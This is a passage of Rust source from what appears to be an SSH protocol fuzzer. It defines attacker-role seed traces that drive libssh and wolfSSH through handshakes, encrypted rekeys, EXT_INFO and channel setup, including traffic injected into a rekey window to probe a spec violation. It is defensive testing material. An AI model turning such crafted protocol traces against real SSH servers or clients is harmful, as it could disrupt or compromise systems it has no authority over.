        fn_sign_userauth((@sid), (fn_username), (fn_ssh_connection), (fn_client_a_pubkey_blob))
    };
    let auth_req = term! {
        fn_encrypt_packet_aesgcm(
            (fn_user_auth_request(
                (fn_username), (fn_ssh_connection), (fn_method_publickey),
                (fn_publickey_auth_data((fn_client_a_pubkey_blob), (@sig)))
            )),
            (@key), (@iv), (fn_u32_auto))
    };

    // Re-exchange under the first keys, same KEXINIT as
    // `seed_client_attacker_rekey` (mutable name-lists).
    let rekey_kexinit_msg = term! {
        fn_kex_init(
            (fn_cookie_zeros),
            (fn_kex_algos((fn_namelist_1((fn_algo_curve25519_sha256))))),
            (fn_sig_schemes((fn_namelist_2((fn_algo_rsa_sha2_512), (fn_algo_rsa_sha2_256))))),
            (fn_enc_algos((fn_namelist_1((fn_algo_aes256_gcm))))),
            (fn_enc_algos((fn_namelist_1((fn_algo_aes256_gcm))))),
            (fn_mac_algos((fn_namelist_1((fn_algo_hmac_sha2_256))))),
            (fn_mac_algos((fn_namelist_1((fn_algo_hmac_sha2_256))))),
            (fn_comp_algos((fn_namelist_1((fn_algo_none))))),
            (fn_comp_algos((fn_namelist_1((fn_algo_none)))))
        )
    };
    let rekey_kexinit = term! {
        fn_encrypt_packet_aesgcm((@rekey_kexinit_msg), (@key), (@iv), (fn_u32_auto))
    };
    let rekey_ecdh_init = term! {
        fn_encrypt_packet_aesgcm(
            (fn_kex_ecdh_init((fn_client_ecdh_pubkey))), (@key), (@iv), (fn_u32_auto))
    };
    let rekey_newkeys = term! {
        fn_encrypt_packet_aesgcm((fn_new_keys), (@key), (@iv), (fn_u32_auto))
    };

    // What the server said during the re-exchange, decrypted from its s2c stream
    // under the FIRST keys (the fold stops where its NEWKEYS switches keys). The
    // transcript also holds the cleartext first exchange, so the rekey KEXINIT and
    // KEX_ECDH_REPLY are the second occurrence (`fn_ordinal_second`).
    let s2c = term! { (server, *)/RawSshMessageFlight };
    let server_kexinit2 = term! {
        fn_decrypted_message((@s2c), (@key_s2c), (@iv_s2c), (fn_msg_kexinit), (fn_ordinal_second))
    };
    let server_ecdh_reply2 = term! {
        fn_decrypted_message((@s2c), (@key_s2c), (@iv_s2c), (fn_msg_kex_ecdh_reply), (fn_ordinal_second))
    };
    let server_ecdh_pub2 = term! { fn_server_ecdh_pubkey((@server_ecdh_reply2)) };
    let shared2 = term! { fn_ecdh_shared_secret((fn_client_ecdh_privkey), (@server_ecdh_pub2)) };
    let exch_hash2 = term! {
        fn_kex_exchange_hash(
            (fn_puffin_id), (@server_banner_id),
            (fn_kexinit_payload((@rekey_kexinit_msg))), (fn_kexinit_payload((@server_kexinit2))),
            (@server_hostkey), (fn_client_ecdh_pubkey), (@server_ecdh_pub2), (@shared2)
        )
    };
    let key2 = term! { fn_derive_aes_key_c2s((@shared2), (@exch_hash2), (@sid)) };
    let iv2 = term! { fn_derive_iv_c2s((@shared2), (@exch_hash2), (@sid)) };

    // Traffic under the NEW keys. Every c2s packet counter is the `fn_u32_auto`
    // sentinel: `preprocess_trace` numbers each packet by its wire position within
    // its key epoch (restarting after the encrypted rekey NEWKEYS), so deleting or
    // reordering steps keeps every GCM nonce valid.
    let chan_open2 = term! {
        fn_encrypt_packet_aesgcm(
            (fn_channel_open((fn_channel_session), (fn_channel_id_0), (fn_window_size_default), (fn_max_packet_size_default),
                             (fn_empty_bytes_vec))),
            (@key2), (@iv2), (fn_u32_auto))
    };
    let global_req2 = term! {
        fn_encrypt_packet_aesgcm(
            (fn_global_request((fn_request_unknown), (fn_true), (fn_empty_bytes_vec))),
            (@key2), (@iv2), (fn_u32_auto))
    };

    Trace {
        prior_traces: vec![],
        descriptors: vec![AgentDescriptor::from_config(
            server,
            SshDescriptorConfig {
                typ: AgentType::Server,
                try_reuse: false,
                ..Default::default()
            },
        )],
        steps: vec![
            OutputAction::new_step(server),
            InputAction::new_step(server, term! { fn_banner(fn_puffin_banner) }),
            OutputAction::new_step(server), // KEXINIT
            InputAction::new_step(server, term! { fn_packet((@our_kexinit)) }),
            InputAction::new_step(
                server,
                term! { fn_packet((fn_kex_ecdh_init((fn_client_ecdh_pubkey)))) },
            ),
            OutputAction::new_step(server), // KEX_ECDH_REPLY, NEWKEYS
            InputAction::new_step(server, term! { fn_packet((fn_new_keys)) }),
            InputAction::new_step(server, term! { @svc_req }),
            OutputAction::new_step(server), // SERVICE_ACCEPT
            InputAction::new_step(server, term! { @auth_req }),
            OutputAction::new_step(server), // USERAUTH_SUCCESS / FAILURE
            InputAction::new_step(server, term! { @rekey_kexinit }),
            OutputAction::new_step(server), // KEXINIT
            InputAction::new_step(server, term! { @rekey_ecdh_init }),
            OutputAction::new_step(server), // KEX_ECDH_REPLY, NEWKEYS
            InputAction::new_step(server, term! { @rekey_newkeys }),
            InputAction::new_step(server, term! { @chan_open2 }),
            OutputAction::new_step(server), // CHANNEL_OPEN_CONFIRMATION
            InputAction::new_step(server, term! { @global_req2 }),
            OutputAction::new_step(server), // REQUEST_FAILURE
        ],
        ..Default::default()
    }
}

/// LEGIT (Tier-1) auto-discovery seed: the honest `seed_client_attacker_rekey`
/// (pubkey-A auth + a COMPLETE client-initiated re-KEX, 0-diff) with every c2s
/// counter as the `fn_u32_auto` sentinel and NO application traffic anywhere near
/// the rekey window. Unlike `seed_client_attacker_rekey_channel_auto` (which places
/// a `CHANNEL_OPEN` one adjacent swap from §7.1), reaching §7.1 from here requires
/// the mutator to INTRODUCE non-KEX traffic INTO the incomplete-rekey window on its
/// own — e.g. `RepeatMutator` duplicating the earlier `SERVICE_REQUEST` /
/// `USERAUTH_REQUEST` into the window, or a splice — a genuinely harder, more
/// autonomous discovery. The counter-renumbering pass is what makes any such
/// insertion viable at all: the introduced packet auto-numbers to the correct
/// epoch-1 counter for its landing position, so the server decodes and PROCESSES
/// it mid-rekey instead of dropping it on a stale nonce.
///
/// Rich-corpus only (single-PUT); the un-mutated seed is 0-diff (identical
/// behaviour to `seed_client_attacker_rekey`).
pub fn seed_client_attacker_rekey_auto(server: AgentName) -> Trace<SshProtocolTypes> {
    let server_banner_id =
        term! { fn_banner_id(((server, 0)[Some(SshQueryMatcher::Banner)]/RawSshMessage)) };
    let server_kexinit = term! { (server, 0)[None]/SshMessage };
    let server_ecdh_reply_msg = term! { (server, 1)[None]/SshMessage };
    let server_ecdh_reply_raw =
        term! { (server, 0)[Some(SshQueryMatcher::MsgType(31))]/RawSshMessage };
    let server_ecdh_pub = term! { fn_server_ecdh_pubkey((@server_ecdh_reply_msg)) };
    let server_hostkey = term! { fn_server_hostkey_raw((@server_ecdh_reply_raw)) };
    let shared = term! { fn_ecdh_shared_secret((fn_client_ecdh_privkey), (@server_ecdh_pub)) };

    let our_kexinit = term! { fn_client_kexinit_aesgcm((fn_placeholder_16bytes)) };
    let i_c = term! { fn_kexinit_payload((@our_kexinit)) };
    let i_s = term! { fn_kexinit_payload((@server_kexinit)) };
    let exch_hash = term! {
        fn_kex_exchange_hash(
            (fn_puffin_id), (@server_banner_id), (@i_c), (@i_s),
            (@server_hostkey), (fn_client_ecdh_pubkey), (@server_ecdh_pub), (@shared)
        )
    };
    let key = term! { fn_derive_aes_key_c2s((@shared), (@exch_hash), (fn_session_id_from_hash((@exch_hash)))) };
    let iv = term! { fn_derive_iv_c2s((@shared), (@exch_hash), (fn_session_id_from_hash((@exch_hash)))) };

    let svc_req = term! {
        fn_encrypt_packet_aesgcm((fn_service_request((fn_ssh_userauth))), (@key), (@iv), (fn_u32_auto))
    };
    let sig = term! {
        fn_sign_userauth((fn_session_id_from_hash((@exch_hash))), (fn_username), (fn_ssh_connection), (fn_client_a_pubkey_blob))
    };
    let auth_req = term! {
        fn_encrypt_packet_aesgcm(
            (fn_user_auth_request(
                (fn_username), (fn_ssh_connection), (fn_method_publickey),
                (fn_publickey_auth_data((fn_client_a_pubkey_blob), (@sig)))
            )),
            (@key), (@iv), (fn_u32_auto))
    };
    let rekey_kexinit = term! {
        fn_encrypt_packet_aesgcm(
            (fn_kex_init(
                (fn_cookie_zeros),
                (fn_kex_algos((fn_namelist_1((fn_algo_curve25519_sha256))))),
                (fn_sig_schemes((fn_namelist_2((fn_algo_rsa_sha2_512), (fn_algo_rsa_sha2_256))))),
                (fn_enc_algos((fn_namelist_1((fn_algo_aes256_gcm))))),
                (fn_enc_algos((fn_namelist_1((fn_algo_aes256_gcm))))),
                (fn_mac_algos((fn_namelist_1((fn_algo_hmac_sha2_256))))),
                (fn_mac_algos((fn_namelist_1((fn_algo_hmac_sha2_256))))),
                (fn_comp_algos((fn_namelist_1((fn_algo_none))))),
                (fn_comp_algos((fn_namelist_1((fn_algo_none)))))
            )),
            (@key), (@iv), (fn_u32_auto))
    };
    let rekey_ecdh_init = term! {
        fn_encrypt_packet_aesgcm(
            (fn_kex_ecdh_init((fn_client_ecdh_pubkey))), (@key), (@iv), (fn_u32_auto))
    };
    let rekey_newkeys = term! {
        fn_encrypt_packet_aesgcm((fn_new_keys), (@key), (@iv), (fn_u32_auto))
    };

    Trace {
        prior_traces: vec![],
        descriptors: vec![AgentDescriptor::from_config(
            server,
            SshDescriptorConfig {
                typ: AgentType::Server,
                try_reuse: false,
                ..Default::default()
            },
        )],
        steps: vec![
            OutputAction::new_step(server),
            InputAction::new_step(server, term! { fn_banner(fn_puffin_banner) }),
            OutputAction::new_step(server), // KEXINIT
            InputAction::new_step(server, term! { fn_packet((@our_kexinit)) }),
            InputAction::new_step(
                server,
                term! { fn_packet((fn_kex_ecdh_init((fn_client_ecdh_pubkey)))) },
            ),
            OutputAction::new_step(server), // KEX_ECDH_REPLY, NEWKEYS
            InputAction::new_step(server, term! { fn_packet((fn_new_keys)) }),
            InputAction::new_step(server, term! { @svc_req }),
            OutputAction::new_step(server), // SERVICE_ACCEPT
            InputAction::new_step(server, term! { @auth_req }),
            OutputAction::new_step(server), // USERAUTH_SUCCESS / FAILURE
            InputAction::new_step(server, term! { @rekey_kexinit }),
            OutputAction::new_step(server), // KEXINIT
            InputAction::new_step(server, term! { @rekey_ecdh_init }),
            OutputAction::new_step(server), // KEX_ECDH_REPLY, NEWKEYS
            InputAction::new_step(server, term! { @rekey_newkeys }),
        ],
        ..Default::default()
    }
}

/// ext-info seed (RFC 8308): the client KEXINIT advertises `ext-info-c`, so the
/// server accepts a client SSH_MSG_EXT_INFO. After NewKeys the client sends an
/// encrypted EXT_INFO (server-sig-algs) as its first packet — exercising the
/// server's EXT_INFO parser — then authenticates by publickey so the handshake
/// completes (proving the EXT_INFO was accepted, not rejected). AES-256-GCM,
/// c2s counters: EXT_INFO 0, SERVICE_REQUEST 1, USERAUTH_REQUEST 2.
pub fn seed_client_attacker_ext_info(server: AgentName) -> Trace<SshProtocolTypes> {
    let server_banner_id =
        term! { fn_banner_id(((server, 0)[Some(SshQueryMatcher::Banner)]/RawSshMessage)) };
    let server_kexinit = term! { (server, 0)[None]/SshMessage };
    let server_ecdh_reply_msg = term! { (server, 1)[None]/SshMessage };
    let server_ecdh_reply_raw =
        term! { (server, 0)[Some(SshQueryMatcher::MsgType(31))]/RawSshMessage };
    let server_ecdh_pub = term! { fn_server_ecdh_pubkey((@server_ecdh_reply_msg)) };
    let server_hostkey = term! { fn_server_hostkey_raw((@server_ecdh_reply_raw)) };
    let shared = term! { fn_ecdh_shared_secret((fn_client_ecdh_privkey), (@server_ecdh_pub)) };

    // KEXINIT offering curve25519-sha256 + the ext-info-c marker.
    let our_kexinit = term! {
        fn_kex_init(
            (fn_placeholder_16bytes),
            (fn_kex_algos((fn_namelist_2((fn_algo_curve25519_sha256), (fn_algo_ext_info_c))))),
            (fn_sig_schemes((fn_namelist_2((fn_algo_rsa_sha2_512), (fn_algo_rsa_sha2_256))))),
            (fn_enc_algos((fn_namelist_1((fn_algo_aes256_gcm))))),
            (fn_enc_algos((fn_namelist_1((fn_algo_aes256_gcm))))),
            (fn_mac_algos((fn_namelist_1((fn_algo_hmac_sha2_256))))),
            (fn_mac_algos((fn_namelist_1((fn_algo_hmac_sha2_256))))),
            (fn_comp_algos((fn_namelist_1((fn_algo_none))))),
            (fn_comp_algos((fn_namelist_1((fn_algo_none)))))
        )
    };
    let i_c = term! { fn_kexinit_payload((@our_kexinit)) };
    let i_s = term! { fn_kexinit_payload((@server_kexinit)) };
    let exch_hash = term! {
        fn_kex_exchange_hash(
            (fn_puffin_id), (@server_banner_id), (@i_c), (@i_s),
            (@server_hostkey), (fn_client_ecdh_pubkey), (@server_ecdh_pub), (@shared)
        )
    };
    let key = term! { fn_derive_aes_key_c2s((@shared), (@exch_hash), (fn_session_id_from_hash((@exch_hash)))) };
    let iv = term! { fn_derive_iv_c2s((@shared), (@exch_hash), (fn_session_id_from_hash((@exch_hash)))) };

    // First post-NewKeys packet: EXT_INFO (RFC 8308 §2.4), counter 0.
    let ext_info = term! {
        fn_encrypt_packet_aesgcm(
            (fn_ext_info((fn_ext_name_server_sig_algs), (fn_ext_val_rsa_sha2))),
            (@key), (@iv), (fn_u32_auto))
    };
    let svc_req = term! {
        fn_encrypt_packet_aesgcm((fn_service_request((fn_ssh_userauth))), (@key), (@iv), (fn_u32_auto))
    };
    let sig = term! {
        fn_sign_userauth((fn_session_id_from_hash((@exch_hash))), (fn_username), (fn_ssh_connection), (fn_client_a_pubkey_blob))
    };
    let auth_req = term! {
        fn_encrypt_packet_aesgcm(
            (fn_user_auth_request(
                (fn_username), (fn_ssh_connection), (fn_method_publickey),
                (fn_publickey_auth_data((fn_client_a_pubkey_blob), (@sig)))
            )),
            (@key), (@iv), (fn_u32_auto))
    };

    Trace {
        prior_traces: vec![],
        descriptors: vec![AgentDescriptor::from_config(
            server,
            SshDescriptorConfig {
                typ: AgentType::Server,
                try_reuse: false,
                ..Default::default()
            },
        )],
        steps: vec![
            OutputAction::new_step(server),
            InputAction::new_step(server, term! { fn_banner(fn_puffin_banner) }),
            OutputAction::new_step(server), // KEXINIT
            InputAction::new_step(server, term! { fn_packet((@our_kexinit)) }),
            InputAction::new_step(
                server,
                term! { fn_packet((fn_kex_ecdh_init((fn_client_ecdh_pubkey)))) },
            ),
            OutputAction::new_step(server), // KEX_ECDH_REPLY, NEWKEYS
            InputAction::new_step(server, term! { fn_packet((fn_new_keys)) }),
            InputAction::new_step(server, term! { @ext_info }),
            InputAction::new_step(server, term! { @svc_req }),
            OutputAction::new_step(server), // SERVICE_ACCEPT
            InputAction::new_step(server, term! { @auth_req }),
            OutputAction::new_step(server), // USERAUTH_SUCCESS / FAILURE
        ],
        ..Default::default()
    }
}

// ── Seed: server attacker with full handshake ─────────────────────────────────
//
// The fuzzer acts as the SSH server; the client is a real libssh instance.
// We use our embedded RSA key to sign the exchange hash so libssh will accept
// the ECDH reply. Then we send encrypted server-to-client messages after NewKeys.

pub fn seed_server_attacker_full(client: AgentName) -> Trace<SshProtocolTypes> {
    // After OutputAction(client):
    //   (client, 0)[None]/RawSshMessage → client banner
    //   (client, 0)[None]/SshMessage    → client KexInit
    // After sending banner + kexinit, client sends KexEcdhInit:
    //   (client, 0)[None]/SshBytes      → client ephemeral pubkey Q_C

    let client_banner_raw = term! { (client, 0)[None]/RawSshMessage };
    let client_banner_id = term! { fn_banner_id((@client_banner_raw)) };
    let client_kexinit = term! { (client, 0)[None]/SshMessage };
    let q_c = term! { (client, 0)[None]/SshBytes };

    let our_kexinit = term! {
        fn_kex_init(
            (fn_placeholder_16bytes),
            ((client, 0)[None]/KexAlgorithms),
            ((client, 0)[None]/SignatureSchemes),
            ((client, 0)[None]/EncryptionAlgorithms),
            ((client, 1)[None]/EncryptionAlgorithms),
            ((client, 0)[None]/MacAlgorithms),
            ((client, 1)[None]/MacAlgorithms),
            ((client, 0)[None]/CompressionAlgorithms),
            ((client, 1)[None]/CompressionAlgorithms)
        )
    };

    let shared = term! {
        fn_ecdh_shared_secret((fn_client_ecdh_privkey), (@q_c))
    };

    let i_c = term! { fn_kexinit_payload((@client_kexinit)) };
    let i_s = term! { fn_kexinit_payload((@our_kexinit)) };

    let exch_hash = term! {
        fn_kex_exchange_hash(
            (@client_banner_id),
            (fn_puffin_id),
            (@i_c),
            (@i_s),
            (fn_server_rsa_pubkey_bytes),
            (@q_c),
            (fn_client_ecdh_pubkey),
            (@shared)
        )
    };

    let sig = term! { fn_sign_exchange_hash((@exch_hash)) };

    let enc_key_s2c = term! {
        fn_derive_enc_key_s2c((@shared), (@exch_hash), (fn_session_id_from_hash((@exch_hash))))
    };

    // Sequence numbers for the server attacker:
    // Attacker sends: banner (not counted), KexInit(0), KexEcdhReply(1), NewKeys(2)
    // First encrypted packets: ServiceAccept(3), UserAuthSuccess(4)
    let svc_accept = term! {
        fn_encrypt_packet(
            (fn_service_accept((fn_ssh_userauth))),
            (@enc_key_s2c),
            (fn_u32_3)
        )
    };
    let auth_success = term! {
        fn_encrypt_packet(
            (fn_user_auth_success),
            (@enc_key_s2c),
            (fn_u32_4)
        )
    };

    Trace {
        prior_traces: vec![],
        descriptors: vec![AgentDescriptor::from_config(
            client,
            SshDescriptorConfig {
                typ: AgentType::Client,
                try_reuse: false,
                ..Default::default()
            },
        )],
        steps: vec![
            OutputAction::new_step(client),
            InputAction::new_step(client, term! { fn_banner(fn_puffin_banner) }),
            InputAction::new_step(client, term! { fn_packet((@our_kexinit)) }),
            // After sending kexinit, client emits KexEcdhInit (captured as q_c above)
            InputAction::new_step(
                client,
                term! {
                    fn_packet((fn_kex_ecdh_reply(
                        (fn_server_rsa_pubkey),
                        (fn_client_ecdh_pubkey),
                        (fn_ssh_signature(
                            (fn_algo_rsa_sha2_256),
                            (@sig)
                        ))
                    )))
                },
            ),
            InputAction::new_step(client, term! { fn_packet((fn_new_keys)) }),
            InputAction::new_step(client, term! { @svc_accept }),
            InputAction::new_step(client, term! { @auth_success }),
        ],
        ..Default::default()
    }
}

// ── Seed: server attacker full handshake over AES-256-GCM ─────────────────────
//
// Fuzzer is the SERVER; the libssh/wolfSSH client is the PUT. Forces
// aes256-gcm@openssh.com and offers only rsa-sha2-256 as the host-key algorithm
// (so the negotiated algorithm matches the rsa-sha2-256 signature). Completes
// the full handshake + encrypted server responses against BOTH implementations.
pub fn seed_server_attacker_full_aesgcm(client: AgentName) -> Trace<SshProtocolTypes> {
    let client_banner_id = term! { fn_banner_id(((client, 0)[None]/RawSshMessage)) };
    let client_kexinit = term! { (client, 0)[None]/SshMessage };
    let q_c = term! { (client, 0)[None]/SshBytes };

    // Fixed server KexInit (aes256-gcm, rsa-sha2-256 host key).
    let our_kexinit = term! { fn_server_kexinit_aesgcm((fn_placeholder_16bytes)) };

    let shared = term! { fn_ecdh_shared_secret((fn_client_ecdh_privkey), (@q_c)) };
    let i_c = term! { fn_kexinit_payload((@client_kexinit)) };
    let i_s = term! { fn_kexinit_payload((@our_kexinit)) };
    let exch_hash = term! {
        fn_kex_exchange_hash(
            (@client_banner_id), (fn_puffin_id), (@i_c), (@i_s),
            (fn_server_rsa_pubkey_bytes), (@q_c), (fn_client_ecdh_pubkey), (@shared)
        )
    };
    let sig = term! { fn_sign_exchange_hash((@exch_hash)) };
    // s2c AES-256-GCM key + IV (direction the server encrypts towards the client).
    let key = term! { fn_derive_aes_key_s2c((@shared), (@exch_hash), (fn_session_id_from_hash((@exch_hash)))) };
    let iv = term! { fn_derive_iv_s2c((@shared), (@exch_hash), (fn_session_id_from_hash((@exch_hash)))) };

    let svc_accept = term! {
        fn_encrypt_packet_aesgcm((fn_service_accept((fn_ssh_userauth))), (@key), (@iv), (fn_u32_auto))
    };
    let auth_success = term! {
        fn_encrypt_packet_aesgcm((fn_user_auth_success), (@key), (@iv), (fn_u32_auto))
    };

    Trace {
        prior_traces: vec![],
        descriptors: vec![AgentDescriptor::from_config(
            client,
            SshDescriptorConfig {
                typ: AgentType::Client,
                try_reuse: false,
                ..Default::default()
            },
        )],
        steps: vec![
            OutputAction::new_step(client),
            InputAction::new_step(client, term! { fn_banner(fn_puffin_banner) }),
            OutputAction::new_step(client), // KEXINIT
            InputAction::new_step(client, term! { fn_packet((@our_kexinit)) }),
            OutputAction::new_step(client), // KEX_ECDH_INIT
            InputAction::new_step(
                client,
                term! {
                    fn_packet((fn_kex_ecdh_reply(
                        (fn_server_rsa_pubkey),
                        (fn_client_ecdh_pubkey),
                        (fn_ssh_signature((fn_algo_rsa_sha2_256), (@sig)))
                    )))
                },
            ),
            OutputAction::new_step(client), // NEWKEYS
            InputAction::new_step(client, term! { fn_packet((fn_new_keys)) }),
            OutputAction::new_step(client), // SERVICE_REQUEST
            InputAction::new_step(client, term! { @svc_accept }),
            OutputAction::new_step(client), // USERAUTH_REQUEST
            InputAction::new_step(client, term! { @auth_success }),
            OutputAction::new_step(client), // CHANNEL_OPEN
        ],
        ..Default::default()
    }
}

/// SERVER-attacker session: `seed_server_attacker_full_aesgcm` continued into the
/// connection protocol, driven by what the CLIENT PUT sends after authentication.
/// Both clients open a "session" channel and then send a want_reply "shell"
/// request (the libssh client harness mirrors `wolfSSH_connect()`), but each picks
/// its own channel number (libssh 43, wolfSSH 0). The attacker derives the c2s
/// key from the handshake it ran, decrypts the client's stream with
/// `fn_decrypted_message`, reads the client's CHANNEL_OPEN `sender_channel`, and
/// answers on THAT channel: CHANNEL_OPEN_CONFIRMATION, then CHANNEL_SUCCESS for
/// the shell request. This drives both clients' channel-setup parsers (a
/// confirmation, a request reply) instead of stopping at USERAUTH_SUCCESS.
pub fn seed_server_attacker_session_aesgcm(client: AgentName) -> Trace<SshProtocolTypes> {
    let client_banner_id = term! { fn_banner_id(((client, 0)[None]/RawSshMessage)) };
    let client_kexinit = term! { (client, 0)[None]/SshMessage };
    let q_c = term! { (client, 0)[None]/SshBytes };

    let our_kexinit = term! { fn_server_kexinit_aesgcm((fn_placeholder_16bytes)) };
    let shared = term! { fn_ecdh_shared_secret((fn_client_ecdh_privkey), (@q_c)) };
    let i_c = term! { fn_kexinit_payload((@client_kexinit)) };
    let i_s = term! { fn_kexinit_payload((@our_kexinit)) };
    let exch_hash = term! {
        fn_kex_exchange_hash(
            (@client_banner_id), (fn_puffin_id), (@i_c), (@i_s),
            (fn_server_rsa_pubkey_bytes), (@q_c), (fn_client_ecdh_pubkey), (@shared)
        )
    };
    let sig = term! { fn_sign_exchange_hash((@exch_hash)) };
    let sid = term! { fn_session_id_from_hash((@exch_hash)) };
    // s2c: what we (the server) send; c2s: what the client sends, to read it back.
    let key = term! { fn_derive_aes_key_s2c((@shared), (@exch_hash), (@sid)) };
    let iv = term! { fn_derive_iv_s2c((@shared), (@exch_hash), (@sid)) };
    let key_c2s = term! { fn_derive_aes_key_c2s((@shared), (@exch_hash), (@sid)) };
    let iv_c2s = term! { fn_derive_iv_c2s((@shared), (@exch_hash), (@sid)) };

    let svc_accept = term! {
        fn_encrypt_packet_aesgcm((fn_service_accept((fn_ssh_userauth))), (@key), (@iv), (fn_u32_auto))
    };
    let auth_success = term! {
        fn_encrypt_packet_aesgcm((fn_user_auth_success), (@key), (@iv), (fn_u32_auto))
    };

    // The channel number the CLIENT chose, from its decrypted CHANNEL_OPEN.
    let c2s = term! { (client, *)/RawSshMessageFlight };
    let client_open = term! {
        fn_decrypted_message((@c2s), (@key_c2s), (@iv_c2s), (fn_msg_channel_open), (fn_ordinal_first))
    };
    let client_chan = term! { fn_sender_channel((@client_open)) };

    let chan_confirm = term! {
        fn_encrypt_packet_aesgcm(
            (fn_channel_open_confirmation((@client_chan), (fn_channel_id_0), (fn_window_size_default),
                                          (fn_max_packet_size_default), (fn_empty_bytes_vec))),
            (@key), (@iv), (fn_u32_auto))
    };
    let chan_success = term! {
        fn_encrypt_packet_aesgcm((fn_channel_success((@client_chan))), (@key), (@iv), (fn_u32_auto))
    };

    Trace {
        prior_traces: vec![],
        descriptors: vec![AgentDescriptor::from_config(
            client,
            SshDescriptorConfig {
                typ: AgentType::Client,
                try_reuse: false,
                ..Default::default()
            },
        )],
        steps: vec![
            OutputAction::new_step(client),
            InputAction::new_step(client, term! { fn_banner(fn_puffin_banner) }),
            OutputAction::new_step(client), // KEXINIT
            InputAction::new_step(client, term! { fn_packet((@our_kexinit)) }),
            OutputAction::new_step(client), // KEX_ECDH_INIT
            InputAction::new_step(
                client,
                term! {
                    fn_packet((fn_kex_ecdh_reply(
                        (fn_server_rsa_pubkey),
                        (fn_client_ecdh_pubkey),
                        (fn_ssh_signature((fn_algo_rsa_sha2_256), (@sig)))
                    )))
                },
            ),
            OutputAction::new_step(client), // NEWKEYS
            InputAction::new_step(client, term! { fn_packet((fn_new_keys)) }),
            OutputAction::new_step(client), // SERVICE_REQUEST
            InputAction::new_step(client, term! { @svc_accept }),
            OutputAction::new_step(client), // USERAUTH_REQUEST
            InputAction::new_step(client, term! { @auth_success }),
            OutputAction::new_step(client), // CHANNEL_OPEN
            InputAction::new_step(client, term! { @chan_confirm }),
            OutputAction::new_step(client), // CHANNEL_REQUEST
            InputAction::new_step(client, term! { @chan_success }),
        ],
        ..Default::default()
    }
}

// ── Legacy ChaCha20 s2c decryption recipe — COMMENTED OUT (kept for reference) ──
//
// `server_decryption_recipes` decrypted a server's first three encrypted outputs
// under chacha20-poly1305. It is not called anywhere: chacha is never negotiated
// in the differential (`uniformise_put_config` pins AES-256-GCM; see
// `differential_fuzzing_terms_to_eval` in protocol.rs), and the live recipe is the
// framing-independent `server_decryption_recipes_aesgcm` below. It is also the
// last code addressing encrypted output by raw POSITION, `(server, N)/OnWireData`,
// which no longer resolves (encrypted chunks are `RawSshMessage` knowledge now,
// matched with `[Some(SshQueryMatcher::OnWire)]`; see the two-party relay seeds).
// To revive it for a ChaCha20 campaign: switch those queries to the `[OnWire]`
// matcher (or better, write a `fn_fold_s2c_transcript_chacha` over the
// concatenated `(server, *)` flight, as the AES-GCM recipe does), then uncomment.
//
// /// Differential-fuzzing decryption recipes for a libssh **server** agent.
// ///
// /// After NewKeys the server's responses are opaque `OnWire` ciphertext, so to
// /// compare two PUTs structurally we reconstruct the server→client (s2c) key
// /// from the server's observed KEX output (exactly as `seed_client_attacker_full`
// /// derives the c2s key, but for the 'D' direction) and decrypt each encrypted
// /// server output back into a typed `SshMessage`.
// ///
// /// The s2c sequence number after NewKeys depends on whether the server enabled
// /// strict KEX (Terrapin mitigation): strict resets the counter to 0, otherwise
// /// it continues (KexInit=0, KexEcdhReply=1, NewKeys=2 → first encrypted = 3).
// /// We therefore emit a recipe at BOTH the strict (0,1,2) and non-strict (3,4,5)
// /// sequence numbers for each of the first three encrypted outputs; the wrong
// /// seqno fails the Poly1305 tag and is skipped during evaluation, so each PUT's
// /// decrypted store fills in message order and the two stores stay aligned.
// ///
// /// NOTE: no longer emitted in the differential (chacha is never negotiated under
// /// `uniformise_put_config`; see `differential_fuzzing_terms_to_eval`). Its
// /// positional `(server, N)/OnWireData` queries are framing-fragile across PUTs.
// /// Retained for reference / potential single-PUT use and as the template to
// /// convert to a framing-independent `fn_fold_s2c_transcript_chacha` if the
// /// cipher set is ever widened.
// #[allow(dead_code)]
// pub fn server_decryption_recipes(server: AgentName) -> Vec<Term<SshProtocolTypes>> {
//     // Reconstruct the exchange hash from the server's KEX output (mirrors
//     // seed_client_attacker_full).
//     let server_banner_id =
//         term! { fn_banner_id(((server, 0)[Some(SshQueryMatcher::Banner)]/RawSshMessage)) };
//     let server_kexinit = term! { (server, 0)[None]/SshMessage };
//     let server_ecdh_reply_msg = term! { (server, 1)[None]/SshMessage };
//     let server_ecdh_reply_raw =
//         term! { (server, 0)[Some(SshQueryMatcher::MsgType(31))]/RawSshMessage };
//     let server_ecdh_pub = term! { fn_server_ecdh_pubkey((@server_ecdh_reply_msg)) };
//     let server_hostkey = term! { fn_server_hostkey_raw((@server_ecdh_reply_raw)) };
//     let shared = term! {
//         fn_ecdh_shared_secret((fn_client_ecdh_privkey), (@server_ecdh_pub))
//     };
//     let our_kexinit = term! {
//         fn_kex_init(
//             (fn_placeholder_16bytes),
//             ((server, 0)[None]/KexAlgorithms),
//             ((server, 0)[None]/SignatureSchemes),
//             ((server, 0)[None]/EncryptionAlgorithms),
//             ((server, 1)[None]/EncryptionAlgorithms),
//             ((server, 0)[None]/MacAlgorithms),
//             ((server, 1)[None]/MacAlgorithms),
//             ((server, 0)[None]/CompressionAlgorithms),
//             ((server, 1)[None]/CompressionAlgorithms)
//         )
//     };
//     let i_c = term! { fn_kexinit_payload((@our_kexinit)) };
//     let i_s = term! { fn_kexinit_payload((@server_kexinit)) };
//     let exch_hash = term! {
//         fn_kex_exchange_hash(
//             (fn_puffin_id),
//             (@server_banner_id),
//             (@i_c),
//             (@i_s),
//             (@server_hostkey),
//             (fn_client_ecdh_pubkey),
//             (@server_ecdh_pub),
//             (@shared)
//         )
//     };
//     let key = term! { fn_derive_enc_key_s2c((@shared), (@exch_hash),
// (fn_session_id_from_hash((@exch_hash)))) };
//
//     // Decrypt each of the first three encrypted server outputs at both the
//     // strict (0,1,2) and non-strict (3,4,5) s2c sequence numbers. The wrong
//     // seqno fails the Poly1305 tag during evaluation and is skipped, so both
//     // PUTs' decrypted stores fill in message order and stay aligned.
//     let mk = |idx_term: Term<SshProtocolTypes>, seqno: Term<SshProtocolTypes>| {
//         let key = key.clone();
//         term! { fn_decrypt_packet((@idx_term), (@key), (@seqno)) }
//     };
//
//     vec![
//         mk(term! { (server, 0)[None]/OnWireData }, term! { fn_u32_0 }),
//         mk(term! { (server, 0)[None]/OnWireData }, term! { fn_u32_3 }),
//         mk(term! { (server, 1)[None]/OnWireData }, term! { fn_u32_1 }),
//         mk(term! { (server, 1)[None]/OnWireData }, term! { fn_u32_4 }),
//         mk(term! { (server, 2)[None]/OnWireData }, term! { fn_u32_2 }),
//         mk(term! { (server, 2)[None]/OnWireData }, term! { fn_u32_5 }),
//     ]
// }

